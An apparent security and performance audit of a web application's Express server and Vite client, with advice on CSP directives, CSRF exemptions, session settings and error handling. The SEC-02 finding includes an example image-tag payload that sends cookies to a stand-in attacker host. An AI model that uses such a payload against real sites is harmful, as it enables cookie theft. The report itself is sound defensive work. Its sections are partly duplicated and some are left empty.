1. Performance
PERF-01 — Massive Google Fonts Bundle with 25+ Typefaces
Location: client/index.html:9
Severity: High
Description: A single <link> tag requests 25+ font families (Architects Daughter, DM Sans, Fira Code, Geist Mono, Geist, IBM Plex Mono, IBM Plex Sans, Inter, JetBrains Mono, Libre Baskerville, Lora, Merriweather, Montserrat, Open Sans, Outfit, Oxanium, Playfair Display, Plus Jakarta Sans, Poppins, Roboto, Roboto Mono, Source Code Pro, Source Serif 4, Space Grotesk, Space Mono). 4. Security
SEC-01 — 'unsafe-inline' in Content Security Policy (scriptSrc & styleSrc)
Location: server/index.ts:25, server/index.ts:30
Severity: High
Description: Both scriptSrc and styleSrc include 'unsafe-inline'. For scriptSrc, this entirely negates XSS protection from the CSP — an attacker who can inject a <script> tag or an inline event handler (onclick) can execute arbitrary code. The comment says it's "Required for Vite in development" for scripts, but both directives apply in production as well since there's no environment-based CSP split.
Fix: For scriptSrc: Move to a nonce-based or hash-based approach. For production Vite builds (which produce hashed JS files, no inline scripts), 'unsafe-inline' is not needed. For styleSrc: Tailwind CSS uses inline style injection during development; in production builds this is not needed either. Implement separate production CSP without 'unsafe-inline' using isProduction:
scriptSrc: isProduction 
  ? ["'self'", "https://js.stripe.com"] 
  : ["'self'", "'unsafe-inline'", "https://js.stripe.com"],

SEC-02 — Overly Permissive imgSrc: "https:" in CSP
Location: server/index.ts:35
Severity: Medium
Description: imgSrc: ["'self'", "data:", "https:"] allows loading images from any HTTPS URL, including attacker-controlled domains. This is overly broad. An XSS payload could use image URLs to exfiltrate data via query parameters (<img src="https://attacker.com/steal?cookie=..."/>).
Fix: Restrict to known sources: imgSrc: ["'self'", "data:", "https://storage.googleapis.com", "https://lh3.googleusercontent.com"] (adjust for the actual OAuth profile image domains used).
SEC-03 — Login/Registration Endpoints Exempt from CSRF
Location: server/middleware/csrf.middleware.ts:51-56
Severity: Medium
Description: /api/login/username and related paths are explicitly exempt from CSRF validation. While the comment explains this is because "login establishes the session," this creates a Login CSRF vulnerability — an attacker could trick a logged-out user into logging in as the attacker's account, then the victim performs actions (making purchases, submitting assessments) that are attributed to the attacker.
Fix: The recommended mitigation for Login CSRF is to use the double-submit cookie pattern specifically for the login form (retrieve a pre-login CSRF token and include it in the form submission), or to include a SameSite=Strict cookie for the initial CSRF token — which is already done. However, given the CSRF cookie is SameSite: "strict", the existing exemption is relatively safe for same-site navigation, but cross-site login CSRF remains possible via form-based POST from another origin. Consider using SameSite: "lax" (which is already set for the session) and issuing a distinct pre-auth CSRF token for the login page.
SEC-04 — Internal Error Messages Exposed to Clients in Payment Routes
Location: server/routes/payment.routes.ts:80, server/routes/payment.routes.ts:305

Stripe SDK errors can contain technical details that help an attacker understand the system's internals.
Fix: Log the full error server-side and return only a generic message: res.status(500).json({ message: "Payment processing failed. Please try again." }).

4. Security
4.1 Google Fonts Blocked by Content Security Policy
Location: server/index.ts:29–73 (CSP directives) and client/index.html:7–9
Severity: Critical
Description: The CSP is configured with fontSrc: ["'self'", "data:"] and styleSrc: ["'self'", "'unsafe-inline'"]. However, client/index.html loads a Google Fonts stylesheet from https://fonts.googleapis.com (a cross-origin <link rel="stylesheet">). In production, Helmet applies this CSP header, which will block the Google Fonts stylesheet request because https://fonts.googleapis.com is not in styleSrc, and the font files from https://fonts.gstatic.com are not in fontSrc. This means in production, all custom fonts fall back to system fonts, breaking the visual design entirely.
Fix (Option A — Allow Google Fonts in CSP): Add to CSP directives:
styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
fontSrc: ["'self'", "data:", "https://fonts.gstatic.com"],

Fix (Option B — Self-host fonts — preferred): Download only Poppins and Inter, serve from client/public/fonts/, and remove the Google Fonts <link> entirely. This also eliminates the render-blocking external request.
4.2 saveUninitialized: true Creates Sessions for All Visitors
Location: server/auth.ts:34
Severity: High
Description: saveUninitialized: true causes a new session to be created and persisted to PostgreSQL for every unauthenticated visitor, including bots, scrapers, and one-time visitors. This inflates the sessions table, wastes database connections, and is potentially a privacy concern (GDPR considerations around tracking anonymous users). This configuration is now discouraged by express-session documentation.
Fix: Change to saveUninitialized: false. This only creates a session when something is explicitly stored in req.session, which is the correct behavior for an authentication system.
4.3 'unsafe-inline' in CSP scriptSrc Weakens XSS Protection
Location: server/index.ts:24–27
Severity: High
Description: scriptSrc includes 'unsafe-inline' (required for Vite in development, the comment notes). However, in production, 'unsafe-inline' in scriptSrc defeats the primary XSS protection benefit of CSP. If an attacker injects a <script> tag or an inline event handler (onclick="..."), the CSP will not block it.
Fix: For production, replace 'unsafe-inline' with a cryptographic nonce ('nonce-<random>'). Since this is a Vite SPA (no inline scripts in the production build), it should be possible to remove 'unsafe-inline' entirely from the production CSP. Use the environment check: only include 'unsafe-inline' when !isProduction.

5.2 Error Handler Re-throws After Sending Response
Location: server/index.ts:190–196
Severity: High
Description:
app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
  const status = err.status || err.statusCode || 500;
  const message = err.message || "Internal Server Error";
  res.status(status).json({ message });
  throw err; // ← PROBLEM
});

After sending the response, the error is re-thrown. This generates an unhandled exception in the async IIFE at server startup. In Node.js, re-throwing from an Express error handler after the response is sent causes "Can't set headers after they are sent" errors or crashes the request context. The globalErrorHandler in errorHandler.middleware.ts is never registered either — it exists but isn't used by the main server.
Fix: Remove throw err from the inline error handler. Alternatively, replace the inline handler with the already-written globalErrorHandler from errorHandler.middleware.ts.
5.3 Pervasive any Types in Server Middleware

5.5 N+1 Database Queries in Admin/Superadmin Endpoints
